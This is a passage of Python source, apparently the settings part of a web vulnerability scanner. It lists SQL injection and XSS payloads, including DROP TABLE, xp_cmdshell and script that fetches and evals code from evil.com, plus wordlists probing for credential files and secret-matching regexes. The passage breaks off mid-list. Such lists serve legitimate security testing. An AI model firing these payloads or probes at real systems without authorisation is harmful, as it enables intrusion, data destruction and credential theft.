import requests
import urllib3
import socket
import os
import concurrent.futures
import os
import sys
import re
import dns.resolver
import socket
import random
from datetime import datetime
from bs4 import BeautifulSoup



# =====================================================
# ============== Setting up DIRECTORIES ===============
# =====================================================



SQLI_PAYLOADS = [
    # Basic Authentication Bypass
    "' OR '1'='1", 
    "' OR '1'='1' --", 
    "' OR 1=1#", 
    "' OR 'a'='a",
    "' OR 1=1 --", 
    "' OR 1=1 /*", 
    "' OR '1'='1' /*", 
    "' OR ''='",
    "admin' --", 
    "admin' #", 
    "admin'/*", 
    "admin' or '1'='1",
    
    # UNION-based SQL Injection
    "' UNION SELECT null, null --", 
    "' UNION SELECT username, password FROM users --",
    "' UNION SELECT 1,2,3,4,5 --", 
    "' UNION SELECT version(), current_user() --",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
    
    # Error-Based SQL Injection
    "' OR 1=1 ORDER BY 1--", 
    "' OR 1=1 ORDER BY 2--", 
    "' OR 1=1 ORDER BY 3--",
    "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%') --",

    # Boolean-Based SQL Injection
    "' AND 1=1 --", 
    "' AND 1=2 --", 
    "' AND 1=1#",
    "' AND 'a'='a", 
    "' AND 'a'='b",
    
    # Time-Based SQL Injection (for Blind SQLi)
    "' OR SLEEP(5) --", 
    "'; WAITFOR DELAY '0:0:5' --", 
    "' OR BENCHMARK(5000000,MD5(1))--",
    "' AND SLEEP(10) --", 
    "' AND (SELECT * FROM (SELECT(SLEEP(10)))a) --",

    # Stacked Queries (if supported)
    "'; DROP TABLE users --", 
    "'; UPDATE users SET password='hacked' WHERE username='admin' --",
    "'; INSERT INTO users (username, password) VALUES ('attacker', 'password') --",

    # Comment Injection
    "'--", 
    "' #", 
    "' /*",

    # Hex and Unicode Encoding Bypass
    "0x27206F72202731273D2731", 
    "0x61646D696E2027204F52202731273D2731",

    # Inline Queries
    "'; EXEC xp_cmdshell('dir') --", 
    "'; EXEC xp_cmdshell('whoami') --",

    # Bypassing WAFs and Filters
    "' OR 1=1--", 
    "' OR 1=1#", 
    "' OR '1'='1' --", 
    "' OR '1'='1' /*",
    "admin' OR '1'='1' --", 
    "admin' OR '1'='1' /*",

    # XML Injection (if applicable)
    "' OR '<username>admin</username>'='admin'",
    
    # Special Encoded Variants
    "%27%20OR%201=1--", 
    "%27%20OR%201=1#", 
    "%27%20OR%20%271%27=%271",
    
    # Double Query Injection (for advanced WAF bypass)
    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0 --",
    "' AND 1=CONVERT(INT,(CHAR(65)))--",

    # Blind SQL Injection with If Conditions
    "' AND IF(1=1, SLEEP(5), 0) --", 
    "' AND IF(1=2, SLEEP(5), 0) --",
    
    # Nested Queries
    "' AND (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))=1 --",
    "' AND (SELECT 1 FROM DUAL WHERE 1=1) --"
]


XSS_PAYLOADS = [
    # Basic Script Injection
    "<script>alert('XSS')</script>", "'><script>alert(1)</script>", "\";alert(1)//",
    "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<svg><script>alert(1)</script></svg>",

    # Event Handlers Exploits
    "<body onload=alert(1)>", "<input type=text onfocus=alert(1)>",
    "<button onclick=alert(1)>Click Me</button>", "<a href=# onmouseover=alert(1)>Hover me</a>",
    "<iframe src=javascript:alert(1)>", "<img src=# onerror=alert('XSS')>",

    # Encoded Variants
    "%3Cscript%3Ealert('XSS')%3C/script%3E", "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "&#x3Cscript&#x3Ealert('XSS')&#x3C/script&#x3E", "&#60;script&#62;alert('XSS')&#60;/script&#62;",

    # JavaScript URI Schemes
    "javascript:alert(1)", "data:text/html,<script>alert('XSS')</script>",
    "vbscript:msgbox('XSS')", "javascript:document.write('<script>alert(1)</script>')",

    # Bypassing Attribute Restrictions
    "<img src='x' onerror='this.src=\"https://dummyimage.com/1x1/000/fff.png\"; alert(1)'>",
    "<input type='text' value='XSS' onfocus='alert(1)'>",

    # Inline JS Execution
    "\"><script>alert(1)</script>", "';alert(1)//", "\");alert(1)//",
    "' onfocus=alert(1) autofocus>", "\" onfocus=alert(1) autofocus>",

    # Case-Insensitive Variants
    "<ScRipT>alert('XSS')</ScRipT>", "<sCrIpT>alert('XSS')</sCrIpT>",
    "<ScRiPt>alert('XSS')</ScRiPt>", "<ScRipT>alert(document.cookie)</ScRipT>",

    # Style-Based Injection
    "<div style=background:url(javascript:alert(1))>", "<style>@import 'javascript:alert(1)';</style>",

    # SVG-Based Attacks
    "<svg onload=alert(1)>", "<svg><script>alert(1)</script></svg>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",

    # Mutation-Based Attacks (DOM XSS)
    "<script>document.body.innerHTML='Hacked!'</script>", "');alert(1)//",
    "'-alert(1)-'", "\"-alert(1)-\"", "');alert(1)//",

    # Object Prototype Pollution
    "{}.__proto__.alert = alert; alert(1)", "Object.defineProperty(window, 'alert', {value: console.log});alert(1)",

    # Iframe Exploits
    "<iframe src=javascript:alert(1)>", "<iframe srcdoc='<script>alert(1)</script>'>",

    # CSP Bypasses (in some weak configurations)
    "<script src=data:text/javascript,alert(1)></script>", "<script>eval('alert(1)')</script>",
    "<script>fetch('http://evil.com').then(r => r.text()).then(eval)</script>",

    # InnerHTML Exploits (for testing DOM XSS)
    "javascript:document.write('<img src=x onerror=alert(1)>')",
    "javascript:document.body.innerHTML='<h1>XSS</h1>'",
    
    # JSON Exploits (if input is parsed as JSON)
    "{\"x\":\"<script>alert(1)</script>\"}", "{\"x\":\"<img src=x onerror=alert(1)>\"}",

    # Bypassing Content Security Policy (CSP)
    "<script>fetch('https://evil.com')</script>", "<script>window.open('https://evil.com')</script>",

    # Testing for stored XSS
    "<textarea> <script>alert(1)</script> </textarea>",
    "<marquee><h1>XSS</h1></marquee>", "<xmp><script>alert(1)</script></xmp>",

    # XSS via Open Redirect
    "<a href='javascript:alert(1)'>Click me</a>", "<a href='data:text/html,<script>alert(1)</script>'>XSS</a>",

    # Advanced HTML Injection
    "<math><mtext><style>*{color:red}</style></mtext></math>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",

    # Clickjacking Attack Vector
    "<iframe src='http://victim.com' style='opacity:0; width:100%; height:100%' onload='alert(1)'></iframe>"
]


COMMON_DIRS = [
    # Admin Panels & Logins
    "admin", "admin-panel", "administrator", "admin_login", "adminportal", "dashboard", 
    "login", "auth", "user", "users", "members", "secure", "cpanel", "sysadmin", 
    "root", "superuser", "mod", "moderator", "staff", "backend",

    # CMS & Backend Systems
    "wp-admin", "wp-login", "joomla", "drupal", "typo3", "ghost", "umbraco", "craft", 
    "cms", "blog-admin", "panel", "directadmin", "plesk", "magento", "phpmyadmin", 

    # Database & Configs
    "db", "database", "sql", "config", "settings", "setup", "install", "init", 
    "configurations", "secrets", "env", ".env", "local", "secure", "vault", "private",

    # Backup & Version Control
    "backup", "backups", "bak", "old", "archive", "dump", "restore", "history", 
    "git", ".git", ".gitlab", ".svn", ".hg", ".bzr", ".env.bak", ".DS_Store",

    # Testing & Debugging
    "test", "tests", "testing", "debug", "dev", "development", "staging", 
    "sandbox", "qa", "demo", "prototype", "mock", "beta", "alpha", 

    # Static & Uploads
    "uploads", "upload", "media", "static", "public", "files", "assets", "resources", 
    "storage", "cdn", "img", "images", "docs", "documents", "content", 

    # Logs & Monitoring
    "logs", "log", "error", "errors", "monitor", "status", "reports", "events", "audit", 
    "analytics", "stats", "usage", "history", "tracking", "server-status", 

    # API & Web Services
    "api", "graphql", "rpc", "webservice", "endpoint", "json", "rest", "soap", "api/private", 
    "swagger", "openapi", "webhook", "ws", "socket", "stream", "token", "keys",

    # Sensitive & Private Directories
    "private", "restricted", "secure", "confidential", "hidden", "secrets", 
    "internal", "classified", "sensitive", "key", "cert", "certs", "keys", "crypto", 

    # Miscellaneous
    "cgi-bin", "cgi", "shell", "sh", "bin", "scripts", "functions", "tools", "jobs", 
    "server", "system", "tmp", "temp", "session", "cache", "robots.txt", "sitemap.xml"
]


UNSAFE_PORTS = {
    21: "FTP - kan onbeveiligd zijn en wachtwoorden verzenden in platte tekst",
    22: "SSH - kan misbruikt worden als zwakke wachtwoorden of verouderde versies worden gebruikt",
    23: "Telnet - verouderd, onversleuteld en kwetsbaar voor afluisteren",
    25: "SMTP - kan misbruikt worden voor het verzenden van spam of phishing-mails",
    53: "DNS - kan gebruikt worden voor DNS amplification en tunneling-aanvallen",
    69: "TFTP - geen authenticatie vereist, kan bestanden lekken",
    80: "HTTP - onbeveiligde webcommunicatie, gevoelig voor MITM-aanvallen",
    110: "POP3 - verouderd en onversleuteld e-mailprotocol, gevoelig voor sniffing",
    111: "RPCBind - vaak misbruikt voor DDoS-aanvallen of systeeminformatie lekken",
    135: "RPC - veel gebruikt door malware en worms om systemen over te nemen",
    137: "NetBIOS - kan gebruikt worden voor SMB-aanvallen en informatielekken",
    138: "NetBIOS Datagram Service - kan misbruikt worden voor netwerk-exploits",
    139: "NetBIOS - Windows bestandsdeling, vaak doelwit van exploits",
    143: "IMAP - kan kwetsbaar zijn bij onveilige configuraties",
    161: "SNMP - kan netwerkconfiguratie en gevoelige gegevens lekken",
    389: "LDAP - kan misbruikt worden voor directory enumeration en inbraken",
    445: "SMB - gebruikt voor bestandsdeling, vaak misbruikt (bijv. EternalBlue)",
    465: "SMTPS - kan onjuist geconfigureerd zijn en e-mail kwetsbaar maken",
    500: "ISAKMP - VPN-protocol, kwetsbaar voor brute-force aanvallen",
    514: "RSH - onversleutelde remote shell, zeer onveilig",
    515: "LPD - oude printservices, kan misbruikt worden voor aanvallen",
    587: "SMTP - kan verkeerd geconfigureerd zijn en open relay toestaan",
    623: "IPMI - kwetsbaar voor aanvallen op serverbeheer",
    993: "IMAPS - versleuteld e-mailprotocol, kan fout geconfigureerd zijn",
    995: "POP3S - versleutelde POP3, maar nog steeds gevoelig voor verkeerde configuraties",
    1080: "SOCKS Proxy - kan gebruikt worden door malware voor anonimiteit",
    1433: "MSSQL - databasepoort, kan misbruikt worden bij zwakke wachtwoorden",
    1521: "Oracle DB - kan gevoelige gegevens blootstellen als onbeveiligd",
    1723: "PPTP VPN - verouderd en kwetsbaar voor afluisteren",
    2049: "NFS - kan toegang geven tot netwerkbestanden bij slechte configuratie",
    2121: "Alternatieve FTP-poort, kan dezelfde risico’s als FTP hebben",
    2375: "Docker API - onbeveiligde toegang tot containers mogelijk",
    2376: "Docker API (TLS) - kan nog steeds kwetsbaar zijn bij verkeerde instellingen",
    3306: "MySQL - databasepoort, mag niet publiek toegankelijk zijn",
    3389: "RDP - vaak aangevallen voor toegang tot Windows-servers",
    5000: "Docker registry - kan gevoelige container-images lekken",
    5001: "Alternatieve Docker registry, mogelijk kwetsbaar",
    5060: "SIP - VoIP, vaak misbruikt voor spamaanvallen en exploits",
    5061: "SIP-TLS - kan verkeerd geconfigureerd zijn en kwetsbaar blijven",
    5432: "PostgreSQL - mag niet publiek openstaan zonder beveiliging",
    5500: "VNC - onversleutelde remote desktop toegang, zeer risicovol",
    5601: "Kibana - kan dashboards en logs blootstellen aan aanvallers",
    5900: "VNC - vaak verkeerd geconfigureerd en doelwit van exploits",
    5985: "WinRM - kan kwetsbaar zijn als het openstaat naar het internet",
    6379: "Redis - standaard zonder authenticatie, kan eenvoudig misbruikt worden",
    7001: "WebLogic - kwetsbaar voor exploits die toegang tot servers geven",
    7071: "Zimbra - mailserver, vaak doelwit van exploits",
    7474: "Neo4j - open databasebeheer, kan gevoelige gegevens blootstellen",
    8000: "Alternatieve webserverpoort, kan onbeveiligde diensten draaien",
    8080: "HTTP alternatief - vaak gebruikt voor onbeveiligde testomgevingen",
    8081: "Alternatieve HTTP-poort, vaak open zonder authenticatie",
    8443: "Alternatieve HTTPS - kan verkeerd geconfigureerd zijn en onveilig zijn",
    8888: "Webproxy - vaak verkeerd ingesteld en open voor misbruik",
    9000: "PHP-FPM - kan gebruikt worden voor remote code execution",
    9200: "Elasticsearch - kan gevoelige data lekken als het openstaat",
    9300: "Elasticsearch Node Communication - kan misbruikt worden door aanvallers",
    9999: "Alternatieve admin interfaces, vaak kwetsbaar voor exploits",
    10000: "Webmin - beheertool, vaak verkeerd geconfigureerd en open",
    27017: "MongoDB - mag nooit open zijn zonder sterke authenticatie",
    27018: "MongoDB Shard - nog steeds kwetsbaar voor exploits",
    50000: "SAP NetWeaver - kan toegang geven tot bedrijfsdata",
    50030: "Hadoop Namenode UI - kan clusterinformatie blootstellen",
    50070: "Hadoop Namenode - toegang tot bestanden en configuraties mogelijk",
    61616: "Apache ActiveMQ - mogelijk kwetsbaar voor remote exploits",
    65535: "Last-resort poort, soms misbruikt voor scanning en exploits"
}


COMMON_FILES = [
    # Environment & Config Files
    "/.env", "/.config", "/config.json", "/config.yml", "/config.xml",
    "/config.ini", "/settings.json", "/settings.yml", "/settings.xml",
    "/settings.ini", "/application.yml", "/application.json", "/application.properties",
    "/parameters.yml", "/parameters.json", "/local.env", "/env.json",
    
    # Secrets & API Keys
    "/secrets.json", "/secrets.yml", "/keys.json", "/tokens.json",
    "/oauth.json", "/auth.json", "/auth_config.json", "/jwt_keys.json",
    "/firebase.json", "/aws-credentials.json", "/gcp-credentials.json",
    "/azure-keys.json", "/stripe-keys.json", "/paypal-config.json",
    
    # JavaScript Files Containing Credentials
    "/config.js", "/main.js", "/app.js", "/settings.js", "/secrets.js",
    "/api.js", "/auth.js", "/firebase.js", "/db.js", "/token.js",
    "/aws.js", "/gcp.js", "/stripe.js", "/paypal.js", "/google.js",
    
    # PHP Configuration Files
    "/config.php", "/wp-config.php", "/database.php", "/db.php",
    "/sql.php", "/auth.php", "/app_config.php", "/admin-config.php",
    "/user-config.php", "/mail-config.php",
    
    # HTML Files with Embedded Secrets
    "/index.html", "/login.html", "/dashboard.html", "/admin.html",
    "/home.html", "/panel.html", "/secure.html", "/oauth.html",
    
    # Logs & Debugging Files
    "/error.log", "/debug.log", "/server.log", "/access.log",
    "/database.log", "/application.log", "/system.log",
    
    # Framework & CMS Configs
    "/laravel.env", "/.flaskenv", "/django_settings.py",
    "/symfony.env", "/nuxt.config.js", "/next.config.js",
    "/gatsby-config.js", "/vue.config.js",
    
    # Cloud Provider & Server Configs
    "/docker-compose.yml", "/docker-compose.override.yml",
    "/kubernetes-config.yml", "/aws-exports.js", "/gcp-settings.json",
    "/azure-config.json", "/firebase.json", "/terraform.tfvars",
    
    # Version Control & Build System Files
    "/.git/config", "/.gitignore", "/.gitlab-ci.yml",
    "/.travis.yml", "/.circleci/config.yml", "/.github/workflows/main.yml",
    
    # Miscellaneous Sensitive Files
    "/htpasswd", "/htaccess", "/private.pem", "/id_rsa",
    "/ssl-cert.pem", "/private_key.pem", "/.ssh/config",
    "/user_credentials.json", "/secret.env",
    
    # Known WordPress & CMS Files
    "/wp-config.php", "/wp-config-sample.php", "/wp-config.bak",
    "/wp-config.old", "/drupal_settings.php", "/joomla_config.php",
    
    # Backup & Temporary Files
    "/backup.sql", "/database.sql", "/db_backup.sql",
    "/config.bak", "/config.old", "/config.save",
    "/secrets.bak", "/keys.bak", "/settings.bak",
    
    # Mobile App & Web App Credentials
    "/google-services.json", "/GoogleService-Info.plist",
    "/app-credentials.json", "/client_secret.json",
    
    # Email & Messaging Credentials
    "/smtp-config.json", "/mail.json", "/mailgun.json",
    "/twilio.json", "/sendgrid.json", "/nexmo.json"
]


SENSITIVE_PATTERNS = [
    # General API Keys
    r"(?i)api[_-]?key\s*[:=]\s*[\"'][A-Za-z0-9-_]{10,}[\"']",  # Generic API Key
    r"(?i)secret\s*[:=]\s*[\"'][A-Za-z0-9-_]{10,}[\"']",      # Generic Secret Key
    r"(?i)token\s*[:=]\s*[\"'][A-Za-z0-9-_]{10,}[\"']",       # Generic Access Token
    r"(?i)client[_-]?id\s*[:=]\s*[\"'][A-Za-z0-9-_]{10,}[\"']",  # OAuth Client ID
    r"(?i)client[_-]?secret\s*[:=]\s*[\"'][A-Za-z0-9-_]{10,}[\"']",  # OAuth Secret
    r"(?i)authorization\s*[:=]\s*[\"'][A-Za-z0-9-_]{10,}[\"']",  # Authorization Header
    r"(?i)access[_-]?token\s*[:=]\s*[\"'][A-Za-z0-9-_]{10,}[\"']",  # Access Token
    r"(?i)bearer\s+[A-Za-z0-9-_]{20,}",  # Bearer Token Format
    
    # Google Cloud Keys
    r"AIza[0-9A-Za-z-_]{35}",  # Google API Key
    r"AIzaSy[A-Za-z0-9-_]{32}",  # Google Maps API Key
    r"AIza[0-9A-Za-z-_]{35}",  # Google Cloud Key
    r"AIza[0-9A-Za-z-_]{39}",  # Google OAuth Client ID

    # AWS Credentials
    r"AKIA[0-9A-Z]{16}",  # AWS Access Key ID
    r"(?i)aws[_-]?secret[_-]?access[_-]?key\s*[:=]\s*[\"'][A-Za-z0-9/+]{40}[\"']",  # AWS Secret Access Key
    r"(?i)aws[_-]?session[_-]?token\s*[:=]\s*[\"'][A-Za-z0-9/+]{40,}[\"']",  # AWS Session Token
    
    # Stripe API Keys
    r"sk_live_[0-9a-zA-Z]{24}",  # Stripe Live Secret Key
    r"pk_live_[0-9a-zA-Z]{24}",  # Stripe Public Key
    
    # GitHub & GitLab Tokens
    r"ghp_[0-9a-zA-Z]{36}",  # GitHub Personal Access Token
    r"gho_[0-9a-zA-Z]{36}",  # GitHub OAuth Token
    r"glpat-[0-9a-zA-Z-_]{20,}",  # GitLab Personal Access Token
    
    # Firebase Keys
    r"firebase[-_.]auth[-_.]key\s*[:=]\s*[\"'][A-Za-z0-9-_]{30,}[\"']",  # Firebase Key
    r"AIza[0-9A-Za-z-_]{35}",  # Firebase API Key
    
    # OpenAI & AI API Keys
    r"sk-[0-9a-zA-Z]{32}",  # OpenAI API Key
    r"hf_[0-9a-zA-Z]{30,}",  # Hugging Face API Key

    # Database Credentials
    r"(?i)db[_-]?password\s*[:=]\s*[\"'][A-Za-z0-9-_!@#%^&*]{6,}[\"']",  # Database Password
    r"(?i)mysql[_-]?password\s*[:=]\s*[\"'][A-Za-z0-9-_!@#%^&*]{6,}[\"']",  # MySQL Password
    r"(?i)mongodb[_-]?uri\s*[:=]\s*[\"']mongodb\+srv://[A-Za-z0-9-_!@#%^&*]+:[A-Za-z0-9-_!@#%^&*]+@[A-Za-z0-9-_!@#%^&*]+/[\"']",  # MongoDB URI

    # Messaging API Keys
    r"(?i)twilio[_-]?sid\s*[:=]\s*[\"'][A-Za-z0-9-_]{34}[\"']",  # Twilio SID
    r"(?i)twilio[_-]?token\s*[:=]\s*[\"'][A-Za-z0-9-_]{32}[\"']",  # Twilio Token
    r"(?i)telegram[_-]?bot[_-]?token\s*[:=]\s*[\"'][0-9]+:[A-Za-z0-9-_]{30,}[\"']",  # Telegram Bot Token
    r"(?i)slack[_-]?token\s*[:=]\s*[\"'][A-Za-z0-9-_]{24,}[\"']",  # Slack API Token
    
    # CI/CD & DevOps Secrets
    r"(?i)github[_-]?token\s*[:=]\s*[\"'][A-Za-z0-9-_]{40}[\"']",  # GitHub Token
    r"(?i)gitlab[_-]?token\s*[:=]\s*[\"'][A-Za-z0-9-_]{40}[\"']",  # GitLab Token
    r"(?i)circleci[_-]?token\s*[:=]\s*[\"'][A-Za-z0-9-_]{40}[\"']",  # CircleCI Token
    
    # Encryption & Private Keys
    r"(?i)ssh[-_.]?private[-_.]?key\s*[:=]\s*[\"'][A-Za-z0-9+/]{40,}[\"']",  # SSH Private Key
    r"(?i)jwt[_-]?secret\s*[:=]\s*[\"'][A-Za-z0-9-_]{32,}[\"']",  # JWT Secret
    
    # Miscellaneous Secrets
    r"(?i)password\s*[:=]\s*[\"'][A-Za-z0-9-_!@#%^&*]{6,}[\"']",  # Generic Password
    r"(?i)secret[_-]?key\s*[:=]\s*[\"'][A-Za-z0-9-_]{32,}[\"']",  # Secret Key
    r"(?i)private[_-]?key\s*[:=]\s*[\"'][A-Za-z0-9-_]{40,}[\"']",  # Private Key
]


COMMON_DNS_MISCONFIGURATIONS = [
    # CNAME Issues  
    "CNAME",  # Dangling CNAMEs leading to subdomain takeovers  
    "CNAME Loops",  # Infinite loops causing resolution failures  
    "Unverified CNAME",  # Pointing to third-party services without verification  

    # MX (Mail Exchange) Issues  
    "MX",  # Misconfigured mail server records allowing email hijacking  
    "Open SMTP Relay",  # Mail server relaying messages without authentication  
    "Invalid MX",  # Non-existent or incorrect mail servers causing email failures  
    "Multiple MX without priority",  # Conflicting priorities leading to delivery issues  

    # TXT Record Issues  
    "TXT",  # Weak SPF/DKIM/DMARC configurations leading to email spoofing  
    "SPF Misconfiguration",  # Overly permissive SPF (e.g., `+all`) allows spoofing  
    "DKIM Misconfiguration",  # Invalid or missing DKIM signatures reduce email security  
    "DMARC Policy Not Enforced",  # Missing or weak policy allows phishing attacks  

    # NS (Name Server) Issues  
    "NS",  # Missing or inconsistent name server records  
    "Open Recursive Resolver",  # Publicly accessible resolver vulnerable to DNS amplification attacks  
    "Delegation Errors",  # Incorrect delegation leading to domain unreachability  
    "Wildcard NS",  # Catch-all NS records potentially exposing subdomains  

    # A and AAAA Record Issues  
    "A",  # IP address misconfigurations leading to downtime or security risks  
    "AAAA",  # IPv6 misconfiguration causing compatibility issues  
    "Unintended Internal IP Exposure",  # A/AAAA records revealing private/internal IPs  
    "Multiple Conflicting A Records",  # Different A records leading to inconsistent routing  

    # PTR (Reverse DNS) Issues  
    "PTR",  # Missing or incorrect reverse DNS affecting email reputation  
    "Mismatched PTR and A Record",  # Reverse lookup doesn’t match forward lookup  

    # SOA (Start of Authority) Issues  
    "SOA",  # Incorrect SOA parameters affecting DNS propagation  
    "Low TTL in SOA",  # Frequent DNS queries causing high overhead  
    "Expired Serial Number",  # Outdated serial numbers causing replication issues  

    # SRV (Service) Record Issues  
    "SRV",  # Misconfigured service records affecting VoIP, chat, or directory services  

    # DNSSEC Issues  
    "DNSSEC Disabled",  # Lack of DNS security allowing forgery and MITM attacks  
    "Expired DNSSEC Keys",  # Outdated cryptographic keys breaking DNS security  

    # Miscellaneous DNS Issues  
    "Wildcard DNS",  # Overly permissive records resolving unintended subdomains  
    "Dangling DNS Records",  # Pointing to non-existent services, enabling takeovers  
    "Exposed Internal Hostnames",  # Internal records accessible externally  
    "Stale DNS Records",  # Outdated records pointing to decommissioned infrastructure  
    "CDN Misconfiguration",  # Incorrect CDN DNS settings causing performance/security issues  
    "Split-Horizon DNS Leak",  # Internal DNS records accessible externally  
    "DNS Cache Poisoning Vulnerability",  # Weak configurations allowing spoofed responses  
]


HEADERS = {
      "Strict-Transport-Security": "Missing or misconfigured",  # Risk: Allows HTTP connections, vulnerable to MITM attacks. Fix: Enforce HTTPS with HSTS.
      "Content-Security-Policy": "Missing",  # Risk: Vulnerable to XSS attacks. Fix: Define CSP rules to restrict script sources.
      "X-Frame-Options": "Missing",  # Risk: Clickjacking attacks. Fix: Use 'DENY' or 'SAMEORIGIN' to block iframe embedding.
      "X-XSS-Protection": "Missing",  # Risk: XSS attacks on legacy browsers. Fix: Set to '1; mode=block'.
      "X-Content-Type-Options": "Missing",  # Risk: MIME type sniffing. Fix: Use 'nosniff' to prevent content spoofing.
      "Referrer-Policy": "Missing",  # Risk: Leaks sensitive referrer data. Fix: Use 'no-referrer' or 'strict-origin'.
      "Permissions-Policy": "Missing",  # Risk: Unrestricted access to APIs (camera, microphone, etc.). Fix: Define feature restrictions.
      "Feature-Policy": "Missing",  # Risk: Deprecated, but had similar risks to Permissions-Policy.
      "Access-Control-Allow-Origin": "Missing or misconfigured",  # Risk: Unrestricted CORS can expose sensitive data. Fix: Allow only trusted origins.
      "Access-Control-Allow-Methods": "Missing or misconfigured",  # Risk: Unrestricted HTTP methods in CORS. Fix: Specify only allowed methods.
      "Access-Control-Allow-Headers": "Missing or misconfigured",  # Risk: Unauthorized headers in requests. Fix: Define specific allowed headers.
      "Expect-CT": "Missing",  # Risk: Fraudulent SSL certificates. Fix: Enforce Certificate Transparency.
      "Cache-Control": "Missing or insecure",  # Risk: Sensitive data may be stored in caches. Fix: Use 'no-store' for sensitive pages.
      "Pragma": "Missing",  # Risk: Legacy cache control issues. Fix: Use 'no-cache' for backward compatibility.
      "Public-Key-Pins": "Deprecated but should be considered",  # Risk: Previously used for certificate pinning, now deprecated.
      "Cross-Origin-Resource-Policy": "Missing",  # Risk: Data leaks through cross-origin requests. Fix: Use 'same-origin' if possible.
      "Cross-Origin-Embedder-Policy": "Missing",  # Risk: Cross-origin resource leaks. Fix: Use 'require-corp'.
      "Cross-Origin-Opener-Policy": "Missing",  # Risk: Cross-origin attacks like Spectre. Fix: Use 'same-origin'.
      "X-DNS-Prefetch-Control": "Missing",  # Risk: Leaks domain information. Fix: Use 'off' to prevent prefetching.
      "Server": "Should be hidden",  # Risk: Exposes server technology to attackers. Fix: Remove or obfuscate server headers.
      "Set-Cookie": "Missing Secure and HttpOnly flags",  # Risk: Session hijacking. Fix: Use 'Secure; HttpOnly; SameSite=Strict'.
      "Timing-Allow-Origin": "Missing or misconfigured",  # Risk: Allows external sites to access timing APIs. Fix: Restrict allowed origins.
      "NEL": "Missing",  # Risk: No network error logging. Fix: Configure network error logging.
      "Report-To": "Missing",  # Risk: No reporting for security violations. Fix: Define reporting endpoints.
      "Sec-Fetch-Site": "Missing",  # Risk: No request origin verification. Fix: Implement fetch metadata protection.
      "Sec-Fetch-Mode": "Missing",  # Risk: Requests could be exploited. Fix: Restrict request types.
      "Sec-Fetch-User": "Missing",  # Risk: Navigation attacks. Fix: Use to verify user-initiated navigation.
      "Sec-Fetch-Dest": "Missing",  # Risk: No destination verification. Fix: Define allowed destinations.
      "X-Permitted-Cross-Domain-Policies": "Missing",  # Risk: Uncontrolled cross-domain policies. Fix: Use 'none' or 'master-only'.
      "X-Download-Options": "Missing",  # Risk: Automatic execution of downloads. Fix: Use 'noopen'.
      "X-Powered-By": "Should be removed",  # Risk: Reveals technology stack. Fix: Remove this header.
      "X-AspNet-Version": "Should be removed",  # Risk: Exposes ASP.NET version. Fix: Remove this header.
      "X-AspNetMvc-Version": "Should be removed",  # Risk: Exposes ASP.NET MVC version. Fix: Remove this header.
      "X-Cache": "Should not reveal caching details",  # Risk: Reveals caching mechanisms. Fix: Remove or obfuscate this header.
      "Surrogate-Control": "Missing",  # Risk: Unoptimized CDN caching. Fix: Define caching behavior.
      "Content-Encoding": "Should be present",  # Risk: No compression leads to slow performance. Fix: Enable gzip or Brotli.
      "Vary": "Should be properly set"  # Risk: Inconsistent caching behavior. Fix: Define appropriate caching settings.
}


OUTDATED_SERVERS = [
    # Apache HTTP Server - Older versions with security risks
    "Apache 1.3", "Apache 2.0", "Apache 2.2", "Apache 2.4.10", "Apache 2.4.18", "Apache 2.4.25",
    
    # Microsoft IIS (Internet Information Services) - Deprecated versions
    "IIS 5.0", "IIS 6.0", "IIS 7.0", "IIS 7.5", "IIS 8.0", "IIS 8.5",
    
    # Nginx - Older versions with potential vulnerabilities
    "nginx 0.7", "nginx 0.8", "nginx 1.0", "nginx 1.2", "nginx 1.4", "nginx 1.6", 
    "nginx 1.8", "nginx 1.10", "nginx 1.12", "nginx 1.14", "nginx 1.16", "nginx 1.18",
    
    # LiteSpeed Web Server - Versions no longer maintained
    "LiteSpeed 4.0", "LiteSpeed 5.0", "LiteSpeed 5.3", "LiteSpeed 5.4",
    
    # Apache Tomcat - Older versions prone to security issues
    "Tomcat 5.5", "Tomcat 6.0", "Tomcat 7.0", "Tomcat 8.0", "Tomcat 8.5",
    
    # Jetty - Outdated versions no longer receiving updates
    "Jetty 6.1", "Jetty 7.6", "Jetty 8.1", "Jetty 9.0", "Jetty 9.2",
    
    # Caddy - Early versions with potential issues
    "Caddy 0.9", "Caddy 1.0", "Caddy 1.1",
    
    # OpenResty - Older releases with security vulnerabilities
    "OpenResty 1.9", "OpenResty 1.11", "OpenResty 1.13", "OpenResty 1.15",
    
    # IBM HTTP Server - Legacy versions that may lack security updates
    "IBM HTTP Server 6.1", "IBM HTTP Server 7.0", "IBM HTTP Server 8.0",
    
    # Sun Java System Web Server - Discontinued web servers
    "Sun Java System Web Server 6.0", "Sun Java System Web Server 7.0",
    
    # Zeus Web Server - Older enterprise server software
    "Zeus Web Server 3.4", "Zeus Web Server 4.3",
    
    # Historical Web Servers - No longer actively maintained
    "CERN HTTPd 3.0", "NCSA HTTPd 1.5",
    
    # Boa - Lightweight web server with old versions
    "Boa 0.94", "Boa 0.95",
    
    # thttpd - Tiny, fast web server with outdated releases
    "thttpd 2.21", "thttpd 2.22",
    
    # Yaws - Older versions of this Erlang-based web server
    "Yaws 1.80", "Yaws 2.0",
    
    # Resin - Java-based web server and application server
    "Resin 3.0", "Resin 3.1", "Resin 4.0",
    
    # Cherokee - Lightweight web server with outdated releases
    "Cherokee 1.0", "Cherokee 1.2", "Cherokee 1.4",
    
    # Roxen - Web server with old unsupported versions
    "Roxen 2.1", "Roxen 2.2",
    
    # Hiawatha - Secure web server with older versions
    "Hiawatha 8.0", "Hiawatha 9.0",
    
    # Xitami - Lightweight web server with discontinued versions
    "Xitami 2.5", "Xitami 2.6",
    
    # Tornado - Older releases of the Python-based web server
    "Tornado 3.0", "Tornado 4.0", "Tornado 4.5",
    
    # WEBrick - Bundled with old versions of Ruby, often insecure
    "WEBrick (old Ruby versions)",
    
    # Monkey HTTPD - Lightweight server with outdated releases
    "Monkey HTTPD 1.0", "Monkey HTTPD 1.1", "Monkey HTTPD 1.2"
]


DNS_SUBS = [
    # Major Cloud Providers
